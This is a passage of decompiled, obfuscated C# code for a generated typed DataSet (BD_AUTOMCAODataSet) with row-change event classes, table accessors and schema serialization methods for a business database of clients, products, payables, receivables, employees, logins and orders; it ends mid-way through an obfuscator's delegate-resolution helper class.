		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public class TB_CADCLIRowChangeEvent : EventArgs
		{
			private TB_CADCLIRow eventRow;

			private DataRowAction eventAction;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CADCLIRow Row => eventRow;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataRowAction Action => eventAction;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CADCLIRowChangeEvent(TB_CADCLIRow row, DataRowAction action)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				eventRow = row;
				eventAction = action;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public class TB_CADPRODRowChangeEvent : EventArgs
		{
			private TB_CADPRODRow eventRow;

			private DataRowAction eventAction;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CADPRODRow Row => eventRow;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataRowAction Action => eventAction;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CADPRODRowChangeEvent(TB_CADPRODRow row, DataRowAction action)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				eventRow = row;
				eventAction = action;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public class TB_CONTASPAGARRowChangeEvent : EventArgs
		{
			private TB_CONTASPAGARRow eventRow;

			private DataRowAction eventAction;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CONTASPAGARRow Row => eventRow;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataRowAction Action => eventAction;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CONTASPAGARRowChangeEvent(TB_CONTASPAGARRow row, DataRowAction action)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				eventRow = row;
				eventAction = action;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public class TB_CONTASRECEBERRowChangeEvent : EventArgs
		{
			private TB_CONTASRECEBERRow eventRow;

			private DataRowAction eventAction;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CONTASRECEBERRow Row => eventRow;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataRowAction Action => eventAction;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CONTASRECEBERRowChangeEvent(TB_CONTASRECEBERRow row, DataRowAction action)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				eventRow = row;
				eventAction = action;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public class TB_FORNECEDORESRowChangeEvent : EventArgs
		{
			private TB_FORNECEDORESRow eventRow;

			private DataRowAction eventAction;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_FORNECEDORESRow Row => eventRow;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataRowAction Action => eventAction;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_FORNECEDORESRowChangeEvent(TB_FORNECEDORESRow row, DataRowAction action)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				eventRow = row;
				eventAction = action;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public class TB_FUNCIONARIOSRowChangeEvent : EventArgs
		{
			private TB_FUNCIONARIOSRow eventRow;

			private DataRowAction eventAction;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_FUNCIONARIOSRow Row => eventRow;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataRowAction Action => eventAction;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_FUNCIONARIOSRowChangeEvent(TB_FUNCIONARIOSRow row, DataRowAction action)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				eventRow = row;
				eventAction = action;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public class TB_LOGINRowChangeEvent : EventArgs
		{
			private TB_LOGINRow eventRow;

			private DataRowAction eventAction;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_LOGINRow Row => eventRow;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataRowAction Action => eventAction;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_LOGINRowChangeEvent(TB_LOGINRow row, DataRowAction action)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				eventRow = row;
				eventAction = action;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public class TB_ORDEMSERVICORowChangeEvent : EventArgs
		{
			private TB_ORDEMSERVICORow eventRow;

			private DataRowAction eventAction;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_ORDEMSERVICORow Row => eventRow;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataRowAction Action => eventAction;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_ORDEMSERVICORowChangeEvent(TB_ORDEMSERVICORow row, DataRowAction action)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				eventRow = row;
				eventAction = action;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public class TB_PEDIDORowChangeEvent : EventArgs
		{
			private TB_PEDIDORow eventRow;

			private DataRowAction eventAction;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_PEDIDORow Row => eventRow;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataRowAction Action => eventAction;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_PEDIDORowChangeEvent(TB_PEDIDORow row, DataRowAction action)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				eventRow = row;
				eventAction = action;
			}
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public class TB_TIPOLANCAMENTORowChangeEvent : EventArgs
		{
			private TB_TIPOLANCAMENTORow eventRow;

			private DataRowAction eventAction;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_TIPOLANCAMENTORow Row => eventRow;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataRowAction Action => eventAction;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_TIPOLANCAMENTORowChangeEvent(TB_TIPOLANCAMENTORow row, DataRowAction action)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				eventRow = row;
				eventAction = action;
			}
		}

		private TB_CADCLIDataTable tableTB_CADCLI;

		private TB_CADPRODDataTable tableTB_CADPROD;

		private TB_CONTASPAGARDataTable tableTB_CONTASPAGAR;

		private TB_CONTASRECEBERDataTable tableTB_CONTASRECEBER;

		private TB_FORNECEDORESDataTable tableTB_FORNECEDORES;

		private TB_FUNCIONARIOSDataTable tableTB_FUNCIONARIOS;

		private TB_LOGINDataTable tableTB_LOGIN;

		private TB_ORDEMSERVICODataTable tableTB_ORDEMSERVICO;

		private TB_PEDIDODataTable tableTB_PEDIDO;

		private TB_TIPOLANCAMENTODataTable tableTB_TIPOLANCAMENTO;

		private SchemaSerializationMode _schemaSerializationMode;

		[NonSerialized]
		internal static GetString \u0017;

		[Browsable(false)]
		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		public TB_CADCLIDataTable TB_CADCLI => tableTB_CADCLI;

		[DebuggerNonUserCode]
		[Browsable(false)]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		public TB_CADPRODDataTable TB_CADPROD => tableTB_CADPROD;

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[Browsable(false)]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		public TB_CONTASPAGARDataTable TB_CONTASPAGAR => tableTB_CONTASPAGAR;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		[Browsable(false)]
		[DebuggerNonUserCode]
		public TB_CONTASRECEBERDataTable TB_CONTASRECEBER => tableTB_CONTASRECEBER;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[Browsable(false)]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		[DebuggerNonUserCode]
		public TB_FORNECEDORESDataTable TB_FORNECEDORES => tableTB_FORNECEDORES;

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		[Browsable(false)]
		public TB_FUNCIONARIOSDataTable TB_FUNCIONARIOS => tableTB_FUNCIONARIOS;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[Browsable(false)]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		[DebuggerNonUserCode]
		public TB_LOGINDataTable TB_LOGIN => tableTB_LOGIN;

		[Browsable(false)]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		public TB_ORDEMSERVICODataTable TB_ORDEMSERVICO => tableTB_ORDEMSERVICO;

		[Browsable(false)]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public TB_PEDIDODataTable TB_PEDIDO => tableTB_PEDIDO;

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		[Browsable(false)]
		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public TB_TIPOLANCAMENTODataTable TB_TIPOLANCAMENTO => tableTB_TIPOLANCAMENTO;

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Visible)]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		[Browsable(true)]
		public override SchemaSerializationMode SchemaSerializationMode
		{
			get
			{
				return _schemaSerializationMode;
			}
			set
			{
				_schemaSerializationMode = value;
			}
		}

		[DebuggerNonUserCode]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public new DataTableCollection Tables => base.Tables;

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		public new DataRelationCollection Relations => base.Relations;

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		public BD_AUTOMCAODataSet()
		{
			\u0008.\u0002.\u0001();
			base..ctor();
			_schemaSerializationMode = SchemaSerializationMode.IncludeSchema;
			BeginInit();
			InitClass();
			CollectionChangeEventHandler value = SchemaChanged;
			base.Tables.CollectionChanged += value;
			base.Relations.CollectionChanged += value;
			EndInit();
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		protected BD_AUTOMCAODataSet(SerializationInfo info, StreamingContext context)
		{
			//IL_03d5: Unknown result type (might be due to invalid IL or missing references)
			//IL_03df: Expected O, but got Unknown
			//IL_009e: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a8: Expected O, but got Unknown
			\u0008.\u0002.\u0001();
			base..ctor(info, context, ConstructSchema: false);
			_schemaSerializationMode = SchemaSerializationMode.IncludeSchema;
			if (IsBinarySerialized(info, context))
			{
				InitVars(initTable: false);
				CollectionChangeEventHandler value = SchemaChanged;
				Tables.CollectionChanged += value;
				Relations.CollectionChanged += value;
				return;
			}
			string s = Conversions.ToString(info.GetValue(\u0004.\u0001.\u0001(1266), typeof(string)));
			if (DetermineSchemaSerializationMode(info, context) == SchemaSerializationMode.IncludeSchema)
			{
				DataSet dataSet = new DataSet();
				dataSet.ReadXmlSchema((XmlReader?)new XmlTextReader((TextReader)new StringReader(s)));
				if (dataSet.Tables[\u0004.\u0001.\u0001(1288)] != null)
				{
					base.Tables.Add(new TB_CADCLIDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1288)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1310)] != null)
				{
					base.Tables.Add(new TB_CADPRODDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1310)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1334)] != null)
				{
					base.Tables.Add(new TB_CONTASPAGARDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1334)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1366)] != null)
				{
					base.Tables.Add(new TB_CONTASRECEBERDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1366)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1402)] != null)
				{
					base.Tables.Add(new TB_FORNECEDORESDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1402)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1436)] != null)
				{
					base.Tables.Add(new TB_FUNCIONARIOSDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1436)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1470)] != null)
				{
					base.Tables.Add(new TB_LOGINDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1470)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1490)] != null)
				{
					base.Tables.Add(new TB_ORDEMSERVICODataTable(dataSet.Tables[\u0004.\u0001.\u0001(1490)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1524)] != null)
				{
					base.Tables.Add(new TB_PEDIDODataTable(dataSet.Tables[\u0004.\u0001.\u0001(1524)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1546)] != null)
				{
					base.Tables.Add(new TB_TIPOLANCAMENTODataTable(dataSet.Tables[\u0004.\u0001.\u0001(1546)]));
				}
				base.DataSetName = dataSet.DataSetName;
				base.Prefix = dataSet.Prefix;
				base.Namespace = dataSet.Namespace;
				base.Locale = dataSet.Locale;
				base.CaseSensitive = dataSet.CaseSensitive;
				base.EnforceConstraints = dataSet.EnforceConstraints;
				Merge(dataSet, preserveChanges: false, MissingSchemaAction.Add);
				InitVars();
			}
			else
			{
				ReadXmlSchema((XmlReader?)new XmlTextReader((TextReader)new StringReader(s)));
			}
			GetSerializationData(info, context);
			CollectionChangeEventHandler value2 = SchemaChanged;
			base.Tables.CollectionChanged += value2;
			Relations.CollectionChanged += value2;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		protected override void InitializeDerivedDataSet()
		{
			BeginInit();
			InitClass();
			EndInit();
		}

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public override DataSet Clone()
		{
			BD_AUTOMCAODataSet bD_AUTOMCAODataSet = (BD_AUTOMCAODataSet)base.Clone();
			bD_AUTOMCAODataSet.InitVars();
			bD_AUTOMCAODataSet.SchemaSerializationMode = SchemaSerializationMode;
			return bD_AUTOMCAODataSet;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		protected override bool ShouldSerializeTables()
		{
			return false;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		protected override bool ShouldSerializeRelations()
		{
			return false;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		protected override void ReadXmlSerializable(XmlReader reader)
		{
			if (DetermineSchemaSerializationMode(reader) == SchemaSerializationMode.IncludeSchema)
			{
				Reset();
				DataSet dataSet = new DataSet();
				int num = (int)dataSet.ReadXml(reader);
				if (dataSet.Tables[\u0004.\u0001.\u0001(1288)] != null)
				{
					base.Tables.Add(new TB_CADCLIDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1288)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1310)] != null)
				{
					base.Tables.Add(new TB_CADPRODDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1310)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1334)] != null)
				{
					base.Tables.Add(new TB_CONTASPAGARDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1334)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1366)] != null)
				{
					base.Tables.Add(new TB_CONTASRECEBERDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1366)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1402)] != null)
				{
					base.Tables.Add(new TB_FORNECEDORESDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1402)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1436)] != null)
				{
					base.Tables.Add(new TB_FUNCIONARIOSDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1436)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1470)] != null)
				{
					base.Tables.Add(new TB_LOGINDataTable(dataSet.Tables[\u0004.\u0001.\u0001(1470)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1490)] != null)
				{
					base.Tables.Add(new TB_ORDEMSERVICODataTable(dataSet.Tables[\u0004.\u0001.\u0001(1490)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1524)] != null)
				{
					base.Tables.Add(new TB_PEDIDODataTable(dataSet.Tables[\u0004.\u0001.\u0001(1524)]));
				}
				if (dataSet.Tables[\u0004.\u0001.\u0001(1546)] != null)
				{
					base.Tables.Add(new TB_TIPOLANCAMENTODataTable(dataSet.Tables[\u0004.\u0001.\u0001(1546)]));
				}
				base.DataSetName = dataSet.DataSetName;
				base.Prefix = dataSet.Prefix;
				base.Namespace = dataSet.Namespace;
				base.Locale = dataSet.Locale;
				base.CaseSensitive = dataSet.CaseSensitive;
				base.EnforceConstraints = dataSet.EnforceConstraints;
				Merge(dataSet, preserveChanges: false, MissingSchemaAction.Add);
				InitVars();
			}
			else
			{
				int num2 = (int)ReadXml(reader);
				InitVars();
			}
		}

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		protected override XmlSchema GetSchemaSerializable()
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected O, but got Unknown
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Expected O, but got Unknown
			MemoryStream memoryStream = new MemoryStream();
			WriteXmlSchema((XmlWriter?)new XmlTextWriter((Stream)memoryStream, (Encoding)null));
			memoryStream.Position = 0L;
			return XmlSchema.Read((XmlReader)new XmlTextReader((Stream)memoryStream), (ValidationEventHandler)null);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		internal void InitVars()
		{
			InitVars(initTable: true);
		}

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		internal void InitVars(bool initTable)
		{
			tableTB_CADCLI = (TB_CADCLIDataTable)base.Tables[\u0004.\u0001.\u0001(1288)];
			if (initTable && tableTB_CADCLI != null)
			{
				tableTB_CADCLI.InitVars();
			}
			tableTB_CADPROD = (TB_CADPRODDataTable)base.Tables[\u0004.\u0001.\u0001(1310)];
			if (initTable && tableTB_CADPROD != null)
			{
				tableTB_CADPROD.InitVars();
			}
			tableTB_CONTASPAGAR = (TB_CONTASPAGARDataTable)base.Tables[\u0004.\u0001.\u0001(1334)];
			if (initTable && tableTB_CONTASPAGAR != null)
			{
				tableTB_CONTASPAGAR.InitVars();
			}
			tableTB_CONTASRECEBER = (TB_CONTASRECEBERDataTable)base.Tables[\u0004.\u0001.\u0001(1366)];
			if (initTable && tableTB_CONTASRECEBER != null)
			{
				tableTB_CONTASRECEBER.InitVars();
			}
			tableTB_FORNECEDORES = (TB_FORNECEDORESDataTable)base.Tables[\u0004.\u0001.\u0001(1402)];
			if (initTable && tableTB_FORNECEDORES != null)
			{
				tableTB_FORNECEDORES.InitVars();
			}
			tableTB_FUNCIONARIOS = (TB_FUNCIONARIOSDataTable)base.Tables[\u0004.\u0001.\u0001(1436)];
			if (initTable && tableTB_FUNCIONARIOS != null)
			{
				tableTB_FUNCIONARIOS.InitVars();
			}
			tableTB_LOGIN = (TB_LOGINDataTable)base.Tables[\u0004.\u0001.\u0001(1470)];
			if (initTable && tableTB_LOGIN != null)
			{
				tableTB_LOGIN.InitVars();
			}
			tableTB_ORDEMSERVICO = (TB_ORDEMSERVICODataTable)base.Tables[\u0004.\u0001.\u0001(1490)];
			if (initTable && tableTB_ORDEMSERVICO != null)
			{
				tableTB_ORDEMSERVICO.InitVars();
			}
			tableTB_PEDIDO = (TB_PEDIDODataTable)base.Tables[\u0004.\u0001.\u0001(1524)];
			if (initTable && tableTB_PEDIDO != null)
			{
				tableTB_PEDIDO.InitVars();
			}
			tableTB_TIPOLANCAMENTO = (TB_TIPOLANCAMENTODataTable)base.Tables[\u0004.\u0001.\u0001(1546)];
			if (initTable && tableTB_TIPOLANCAMENTO != null)
			{
				tableTB_TIPOLANCAMENTO.InitVars();
			}
		}

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		private void InitClass()
		{
			base.DataSetName = \u0004.\u0001.\u0001(1584);
			base.Prefix = \u0017(198);
			base.Namespace = \u0004.\u0001.\u0001(1624);
			base.EnforceConstraints = true;
			SchemaSerializationMode = SchemaSerializationMode.IncludeSchema;
			tableTB_CADCLI = new TB_CADCLIDataTable();
			base.Tables.Add(tableTB_CADCLI);
			tableTB_CADPROD = new TB_CADPRODDataTable();
			base.Tables.Add(tableTB_CADPROD);
			tableTB_CONTASPAGAR = new TB_CONTASPAGARDataTable();
			base.Tables.Add(tableTB_CONTASPAGAR);
			tableTB_CONTASRECEBER = new TB_CONTASRECEBERDataTable();
			base.Tables.Add(tableTB_CONTASRECEBER);
			tableTB_FORNECEDORES = new TB_FORNECEDORESDataTable();
			base.Tables.Add(tableTB_FORNECEDORES);
			tableTB_FUNCIONARIOS = new TB_FUNCIONARIOSDataTable();
			base.Tables.Add(tableTB_FUNCIONARIOS);
			tableTB_LOGIN = new TB_LOGINDataTable();
			base.Tables.Add(tableTB_LOGIN);
			tableTB_ORDEMSERVICO = new TB_ORDEMSERVICODataTable();
			base.Tables.Add(tableTB_ORDEMSERVICO);
			tableTB_PEDIDO = new TB_PEDIDODataTable();
			base.Tables.Add(tableTB_PEDIDO);
			tableTB_TIPOLANCAMENTO = new TB_TIPOLANCAMENTODataTable();
			base.Tables.Add(tableTB_TIPOLANCAMENTO);
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		private bool ShouldSerializeTB_CADCLI()
		{
			return false;
		}

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		private bool ShouldSerializeTB_CADPROD()
		{
			return false;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		private bool ShouldSerializeTB_CONTASPAGAR()
		{
			return false;
		}

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		private bool ShouldSerializeTB_CONTASRECEBER()
		{
			return false;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		private bool ShouldSerializeTB_FORNECEDORES()
		{
			return false;
		}

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		private bool ShouldSerializeTB_FUNCIONARIOS()
		{
			return false;
		}

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		private bool ShouldSerializeTB_LOGIN()
		{
			return false;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		private bool ShouldSerializeTB_ORDEMSERVICO()
		{
			return false;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		private bool ShouldSerializeTB_PEDIDO()
		{
			return false;
		}

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		[DebuggerNonUserCode]
		private bool ShouldSerializeTB_TIPOLANCAMENTO()
		{
			return false;
		}

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		private void SchemaChanged(object sender, CollectionChangeEventArgs e)
		{
			if (e.Action == CollectionChangeAction.Remove)
			{
				InitVars();
			}
		}

		[DebuggerNonUserCode]
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public static XmlSchemaComplexType GetTypedDataSetSchema(XmlSchemaSet xs)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0030: Expected O, but got Unknown
			//IL_0036: Expected O, but got Unknown
			//IL_008a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0091: Expected O, but got Unknown
			BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
			XmlSchemaComplexType val = new XmlSchemaComplexType();
			XmlSchemaSequence val2 = new XmlSchemaSequence();
			((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)new XmlSchemaAny
			{
				Namespace = bD_AUTOMCAODataSet.Namespace
			});
			val.Particle = (XmlSchemaParticle)val2;
			XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
			if (xs.Contains(schemaSerializable.TargetNamespace))
			{
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = new MemoryStream();
				try
				{
					schemaSerializable.Write((Stream)memoryStream);
					IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
					while (enumerator.MoveNext())
					{
						XmlSchema val3 = (XmlSchema)enumerator.Current;
						memoryStream2.SetLength(0L);
						val3.Write((Stream)memoryStream2);
						if (memoryStream.Length == memoryStream2.Length)
						{
							memoryStream.Position = 0L;
							memoryStream2.Position = 0L;
							while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
							{
							}
							if (memoryStream.Position == memoryStream.Length)
							{
								return val;
							}
						}
					}
				}
				finally
				{
					memoryStream?.Close();
					memoryStream2?.Close();
				}
			}
			xs.Add(schemaSerializable);
			return val;
		}

		static BD_AUTOMCAODataSet()
		{
			Strings.CreateGetStringDelegate(typeof(BD_AUTOMCAODataSet));
		}
	}
}
namespace \u0001
{
	internal class \u0002
	{
	}
}
namespace \u0010
{
	internal class \u0002
	{
		internal delegate void \u0001(object o);

		internal static Module \u0001;

		internal static void \u0001(int \u0002)
		{
			Type type = \u0010.\u0002.\u0001.ResolveType(33554432 + \u0002);
			FieldInfo[] fields = type.GetFields();
			foreach (FieldInfo fieldInfo in fields)
			{
				MethodInfo method = (MethodInfo)\u0010.\u0002.\u0001.ResolveMethod(fieldInfo.MetadataToken + 100663296);
				fieldInfo.SetValue(null, (MulticastDelegate)Delegate.CreateDelegate(type, method));
			}
		}

		public \u0002()
		{
			\u0008.\u0002.\u0001();
			base..ctor();
		}

		static \u0002()
		{
